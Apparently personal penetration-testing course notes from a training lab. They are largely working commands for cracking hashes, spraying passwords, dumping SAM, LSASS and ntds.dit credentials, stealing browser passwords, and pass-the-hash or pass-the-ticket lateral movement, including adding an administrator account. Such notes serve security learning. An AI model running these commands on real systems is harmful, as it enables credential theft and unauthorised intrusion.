Passwords are commonly hashed when stored.  
Hashing is a mathematical function which transforms arbitrary number of input bytess into fixed-size output.  
examples: md5, sha-256  
**Password cracking**: using rainbow tables, dictionary wordlists, bruteforce  
Rainbow tables are large pre-compiled maps of input to output for a given hash function.  
can be used to quickly id pass if hash already mapped.  

Salt: random squence of bytes added to a password before it is hashed.  
salts are typically prepended to corresponding hashes  

Brute-force attack: all possible combinations  
Dictionary attack: wordlist attack, most efficient  
weakpass generator, seclists, rockyou.txt  

**Identifying hash formats**:  
https://openwall.info/wiki/john/sample-hashes  
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

hashid -j xxxxxxxxx  //id john format  
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'  //id hashcat module type  


**John The Ripper**: aka john  
john --single passwd  //single crack mode - rule based, good for cracking linux pass - file to include passwd full line not just hash  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  //wordlist mode  
john --incremental hash.txt  //brute-force style, most time consuming, defined in: /etc/john/john.conf  
john --format=krb4 hash.txt --wordlist=wordlist.txt  //specify format  
ssh2john ssh.privatekey > file.hash  //converts password protected file into john hash  
locate *2john*   //list all the supported conversions of pasword protected files  

**Hashcat**:  
hashcat --help  
ls -l /usr/share/hashcat/rules  //rules  
hashcat -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  //using rule  
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'  //Upperletter4lowerlettersdigitandSPACE -- mask attack -a 3  
//use mask attack when there is a static pattern !!  
//use rules for better results  

**Generating custom wordlists and Rules**:  
https://weakpass.com/tools/passgen   //weak pass generator - now provides wordlist  

hashcat rules - /usr/share/hashcat/rules/best64.rule  -- widely used  
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list  //generate a wordlist based on custom rules file  
with known pass policy and few details of the target user, can use below  
hashcat -m 0 hash mark -r rule  //mark is the file with words of known info, ask gpt for rule  

cewl https://www.sodium410.com -d 4 -m 6 --lowercase -w words.txt  //generates min len 6 pass in lowercase with 4 spider depth  

**Cracking Protected Files**: locate *2john* | grep pdf    
https://fileinfo.com/filetypes/encoded  

Find SSH keys:  
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null  
One way to tell whether an SSH key is encrypted or not, is to try reading the key with ssh-keygen.  
ssh-keygen -yf ~/.ssh/id_rsa   //asks for a passphrase !!  

ssh2john.py SSH.private > ssh.hash  //ssh2john  
office2john.py Protected.docx > protected-docx.hash  
pdf2john.py PDF.pdf > pdf.hash  
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt ssh.hash  //crack the hash for passphrase  
john pdf.hash --show  //show cracked pass of hash  

Cracking openssl encrypted GZIP files  
file test.gzip  ///show fiLe info  
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done  
//throws errors ignore, once loop finished check the current dir for extracted files  

Cracking Bitlocker-encrypted drives: common to find virtual hard drives    
bitlocker2john -i Backup.vhd > backup.hashes  
grep "bitlocker\$0" backup.hashes > backup.hash  //filter for bitlocker password hash  
//outputs 4 diff hashes, try the first one later two are recovery key hashes  
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329........8ec54f' /usr/share/wordlists/rockyou.txt  

To mount bitlocker encyrpted drives in windows - double click  
on linux - install - sudo apt install dislocker  
google for steps  

**Remote Service Password attacks**:  
Winrm:  
netexec winrm 10.129.42.197 -u user.list -p password.list  //crackmapexec spray  
evil-winrm -i 10.129.42.197 -u user -p password  //evil-winrm gives powershell  

SSH/RDP/SMB:  
hydra -L user.list -P password.list ssh://10.129.42.197  
hydra -L user.list -P password.list rdp://10.129.42.197  
hydra -L user.list -P password.list smb://10.129.42.197  
//if errors for smb use crackmapexec or msf  

**Credential spraying/stuffing**:  
netexec smb 10.100.38.0/24 -u usernames.list> -p 'ChangeMe123!'  
hydra -C user_pass.list ssh://10.100.38.23  //-C for list with user:pass format  

**Default creds**:  
https://github.com/ihebski/DefaultCreds-cheat-sheet  
https://www.softwaretestinghelp.com/default-router-username-and-password-list/  
pip3 install defaultcreds-cheat-sheet  //install 
creds search cisco  //search  

## Extracting Passwords from Windows Systems:  
LSASS: Local Security authoriry subsystem service: authenticates users, manages local logins, users to SID   
SAM(Security account manager) database: stores LM or NTLM hashes, C:\system32\SAM, system priv  
AD database of creds: %SystemRoot%\ntds.dit  
*Credential manager*: built-in win featyre to store/manage creds for web,apps,network  
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\  //for every user  

**Local dumping**: say with shell to windows system..  
Registry hives: copy these and extract pass using secretsdump  
HKLM\SAM: sam db  
HKLM\SYSTEM: key that encrypts SAM  
HKLM\SECURITY: cached domain and cleartext pass used by LSA  

reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

impacket-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL //dumps creds from all 3 hives  
Copy just the NT hash(2nd part) and crack it using hashcat  
sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt  
hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes, more diff to crack and can;t be used for PTH..  
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt  

DPAPI creds used by credential manager, browsers to encrypt saved creds, can also be cracked using mimikatz  
C:\Users\Public> mimikatz.exe  
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect  

**Remote dumping**: with creds..  try both crackmapexec and secretsdump  
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa  //lsa  
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam  //sam  
secretsdump.py DOMAIN/user:Password123@192.168.1.10  //no domain for local accounts  

Attacking LSASS: just like we manually extracted SAM, can do lsass dump save it and crack offline with pypikatz  
with powershell find the pid and dump it with rundll32..  
Get-Process lsass  
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
pypykatz lsa minidump /home/peter/Documents/lsass.dmp   
//this is manual, better use secretsdump or crackmapexec or mimikatz  

**Attacking windows credential manager**:
cmdkey /list //cmd //creds stored in current user profile  
runas /savecred /user:SRV01\mcharles cmd  //if any domain interactive creds found, can switch to using runas  
With mimikatz..  reveaks pass hash as welll //mimikatz requires admin, so first imperosnate then run mimikatz or Lazagne creds manager stealer       
mimikatz.exe  
privilege::debug  
sekurlsa::credman  
Lasagne is much simpler, jsut run exe - reveals cleartext pass..  

**Attacking Active Directory and NTDS.dit**  
Dictionary attack against AD accounts using netexec -- create a list of usernames from social media or something or custom  
usernames --- sam not user principal names user principal names used in email  
can use tool username-anarchy to convert real names into usernames ./username-anarchy -i /home/ltnbob/names.txt  
Once we have a list of usernames, can verify their validity with kerbrute  
./kerbrute_linux_amd64 userenum --dc 10.1.1.1 --domain test.local names.txt  
Once we have valid users, can launch brute force using netexec but if there is password lockout policy then try spraying with few passwords  
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt  

Capturing NTDS.dit - NT Directory services . dit directory information tree - primary DB file stored everything  
stored at %systemroot%/ntds on the domain controllers It is very likely that NTDS will be stored on C:  
the compromised account has domian admin rights which we can use to copy ntds.dit  
can use vssadmin to do a volume shadow copy, copy volume c  
we can;t directly copy the ntds.dit due to mandatory file lock hence create a show of volume and then copy it from the shadow copy  

evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'  
C:\> vssadmin CREATE SHADOW /For=C:   //create a shoadow copy  
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit  //copy ntds from shadow copy  
Now extract it to attacker machine say kali  
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL  //dump the hashes locally from ntds.dit file  

Faster method to capture ntds.dit using netexec  //shadow copy steps waste of time  
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil  

Once hashes dumped, can use hashcat to crack the NT hashes  
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt  
If no crack then pass the hashes using evil-winrm or netexec  
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b  

**Credential Hunting in Windows**:  
Once we have access to a target Windows machine through the GUI or CLI  
Gui/cli search for keyword password  
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml  
LaZagne -- tool to discover creds stored in browser and other apps such as chats, mails, memory, wifi, 
C:\Users\bob\Desktop> start LaZagne.exe all  //good to keep a copy, copy paste with xfreerdp  
Other places -- Group policies in Sysvol, IT shares, web.config, unattend.xMl, AD description fields, keepass database, files  

## Extracting Passwords from Linux Systems  
**Linux Authentication process**  
PAM - pluggable authentication modules - commonly used authentication mechanism  
/etc/passwd -- user list their homedir default-shell userid, group id  
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash  
/etc/shadow -- password hashes -- if no x in /etc/passwd -- then no password, if /etc/passwd is writable then remove x  
If the Password field contains a character such as ! or *, the user cannot log in using a Unix password.  
However, other authentication methods—such as Kerberos or key-based authentication—can still be used  
The PAM library (pam_unix.so) can prevent users from reusing old passwords.  
These previous passwords are stored in the /etc/security/opasswd file  - need privilege check to see the patterns  

Cracking Linux Credentials  -- once we have priv can copy shadow file and crack pass  
we can use a tool called unshadow, which is included with John the Ripper (JtR).  
It works by combining the passwd and shadow files into a single file suitable for cracking.  
sudo cp /etc/passwd /tmp/passwd.bak  
$ sudo cp /etc/shadow /tmp/shadow.bak  
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes  
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked  
john --single hash.txt  ''john single attack mode, include eVerything starting with username to end  martin:\$6\$0  

**Credential Hunting in Linux**  
covered in linux privesc -- use the scripts in teddy  
check files, scripts, ssh keys, cronjobs, notes, databases, config files, history files, log files  
Memory and cache -- use mimipenguin  - requires priv - gets creds stored in browser, in memory or in files  
LaZagne -- for browser,aws, sessions, browsers, wifi, cli etc  
sudo python2.7 laZagne.py all  
Browser credentials -- Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused.  
Firefox Decrypt -- can be used to decrypt creds in logins.json of firefox  
python3.9 firefox_decrypt.py  
LaZagne can also return same creds -- no priv required  
python3 laZagne.py browsers  
presense of .mozilla in users home directory is a hint  
/home/soda/.mozilla/firefox/ytb95ytb.default-release/logins.json  

## Extracting Passwords from the Network  
**Credential Hunting in Network Traffic**  
Cleartext services -- http, ftp, snmp, pop3, imap, smtp, ldap etc  
Using wireshark -- search query http contains "passw"  
Using Pcredz -- to extract creds from live traffic or network packet captures  
./Pcredz -f demo.pcapng -t -v  

**Credential Hunting in Network Shares**  
Snaffler - windows - run on a domain joined machine, automatically searches for interesting files  
c:\Users\Public>Snaffler.exe -s  //basic search  
PowerHuntShares --- powershell - doesn't necessarily need domain joined machine, it generates html report  
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public  

Linux...
Manspider - allow us to scan SMB shares from Linux  
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'  
Crackmapexec -- nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"  

## Windows Lateral Movement Techniques  
## Pass the Hash(PtH) :  
From Windows: using mimikatz, powershell  
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit  //starts cmd of target  

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1  
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark  Password123 /add && net localgroup administrators mark /add" -Verbose  

From Linux: impacket, netexec, evilwinrm, xfreerdp  
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453  
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453  
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami  //command execution  
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453  

RDP PtH possible only if restricted admin mode disabled by default is enabled on target otherwise error account restrictions preventing  
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f  
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B  

UAC Limits pass the hash for local accounts(UAC restrictions on local accounts for local accounts, however this restriction doesn't apply if user is part of local admin group and is a domain user)  
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0,  
it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.  
Setting it to 1 allows the other local admins as well.  

## Pass the Ticket(PtT) from Windows: passing stolen kerberos tickets tgts and tgs  
OverPass-the-Hash Aka pass the key --- instead of passing tgt which expire in 10 hours,  
We extract the kerberos encryption keys which is basically users password hashes aes/Rc4 stored in lsass for sso  
this user hash is dumped and used to request the TGT for the user(This is the key used in AS-REQ timestamp encryption to prove users identity)  
Pass the ticket is stealthier instead of requesting new ticket  
AD structurally uses the exact same mathematical value for both the NTLM hash and the kerberos RC4 key  
so this RC4 and NT hasH both are same ... if dumped we could use it to to pass the hash with NTLM  
If RC4 is disabled domain-wide, KDC will reject the NTLM/Rc4 hash, then we need aes keys instead  
Dumping the tgt basically dumps just the ticket in .kirb, can simply pass this ticket  
both kerberos master key and kerberos tickets are stored in lsass memory - need admin to extract  

.kirbi is just a generic file format used by mimikatz and rubeus to save exported kerberos tickets to disk  
how to tell whether its tgt or tgs ?  
if the service name targets the krbtgt account this is tgt  
if the service name targets mssqlsv then its a tgs  
Rubeus.exe describe /ticket:C:\path\to\ticket.kirbi  //check type look for service name  

....**With Mimikatz**....  mimikatz.exe  privilege::debug  
sekurlsa::tickets /export   //harvest tickets //saves tickets as .kirb  

sekurlsa::ekeys  //extract aes/rc4 kerberos keys for overpass-the-hash   
sekurlsa::pth /domain:soda.com /user:plaintext /ntlm:3f74aa8f0f09cd5177b5c1ce50f  //gets a new tgt from kdc and starts a new cmd.exe in context of target user  
//Mimikatz doesn't support overpass-the-hash with aes only rc4/ntlm supported, for aes use rubeus  

kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"  
//pass the ticket  once imported #exit - to exit mimikatz and try c:\tools> dir \\DC01.soda.com\c$  
//same after mimikatz exit try -- launch powershell and Enter-PSSession -ComputerName DC01  //connects as a kerberos tgt user to the target computer over winrm  


.....**With Rubeus**.....  
Rubeus.exe dump /nowrap  //harvest tickets, better mimikatz sometime error  //returns base64 encoded ticket  
Rubeus.exe dump /service:krbtgt /nowrap /filename:C:\Users\Public\      //automatically parses and wites .kirb to the given path  

//rubeus cannot dump the kerberos master encyption keys, so use mimikatz to dump them and use rubeus to overpass-the-aes-hash  
Rubeus.exe asktgt /domain:soda.om /user:plaintext /aes256:b21c99fc068e312TIMESNTLMa8fda3fe60 /nowrap  
//overpass-the-hash aes hash using rubeus //prints the ticket in Base64 can use /filename:C:\Users\Public\ to save it as .kirb  

Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt  
//overpass-the-hash and import target users tgt into the session  
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt   
//imports the ticket to current logon session //here its overpass-the-hash and import  
c:\tools> dir \\DC01.soda.com\c$  //as smb/PSexec will alwasy try to use kerberos first if ok OK otherwise NTLM FALLBACK  


Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi  
//pass the ticket extracted and stored in .kirbi  
c:\tools> dir \\DC01.soda.com\c$  
 
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBSNIPPED   //pass the ticket using a base64 encoded kirb  

//powershell remoting with rubeus is different, 
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show  //this opens a new cmd window  
//here on new windows pass the hash /ptt using rubeus and then launch powershell and use psremoting as depicted in mimikatz section  
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi  

## Pass the Ticket(PtT) from Linux:  
In most cases, Linux machines store Kerberos tickets as **ccache** files in the /tmp directory.  -- need perm to read  
By default, the location of the Kerberos ticket is stored in the environment variable **KRB5CCNAME**.  
Another everyday use of Kerberos in Linux is with **keytab** files.  has user principal and kerberos master keys of user  
can use a keytab file to authenticate to various remote systems using Kerberos without entering a password  
commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction  

**Identity Linux and AD integration**  
realm list  //prints the domain joined info  
ps -ef | grep -i "winbind\|sssd"   //if realm not present, use this to check if linux machine is domain joined look for domain name  

**Finding kerberos tickets in Linux**  
---Finding keytabs---
find / -name *keytab* -ls 2>/dev/null   //list keytab files ex: carlos.keytab  
//to use a keytab file we must have a read and write perms on the file  //this is maybe not just read should do double check  
/etc/krb5.keytab - computer account keytab file location - read root priv, can impersonate computer account  

---Finding ccache files---
env | grep -i krb5  //check env variables KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh  
ls -la /tmp   //ccahe in default tmp  

**Abusing keytab files**  
klist -k -t /opt/specialfiles/carlos.keytab   //to know which user the keytab was created for  
klist  //check current user not carlos   
kinit carlos@soda.HTB -k -t /opt/specialfiles/carlos.keytab  //import carlos keytab  
klist  //check default principal now changed to carlos  
smbclient //dc01/carlos -k -c ls  //access smb using imported kerberos ticket  

**Keytab extract**  -- same as extracting kerberos master keys for overpass-the-hash  
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab  //extracts ntlm/rc4/aes hashes that can be used for overpass-the-hash  
if ntlm/rc4/aes hash cracked then switch to that user  su - carlos@soda.htb  
//can use the same command to extract hashes from .kt files as well .kt is also keytab file abbreviation  

**Abusing ccache**  
To abuse a ccache file, all we need is read privileges on the file.  
These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.  
ls -la /tmp  //find new user julio  // id julio@inlanefreight.htb  //reveals part of domain admins  
klist -- check current kerberos  
cp /tmp/krb5cc_647401106_I8I133 .  //copy the ccache file from /tmp to current  
export KRB5CCNAME=/test/krb5cc_647401106_I8I133  
klist ---  imported kerb user julie  
smbclient //dc01/C$ -k -c ls -no-pass  //read domain admin C$ with k kerberos auth  

## Using Linux attack tools with kerberos  



**Password policies**:  
passwords to expire, account lockout, password strength, password history  
NIST, CIS and PCI DSS password policy guides  
use password generators, use multiple words easy still strong because of length  

**Password Managers**:  
Lastpass, 1Password, Keepass, password safe  
Alternatives: Go Passwordless, MFA, Justintimeaccess, IP restrictions, deivce compliance enforcement  

Check schedued tasks and other scripts for the use of kerberos tickets  
kinit tool to import keytab into user session, look for kerberos tickets .kt in scripts/tasks also for keyword kinit  





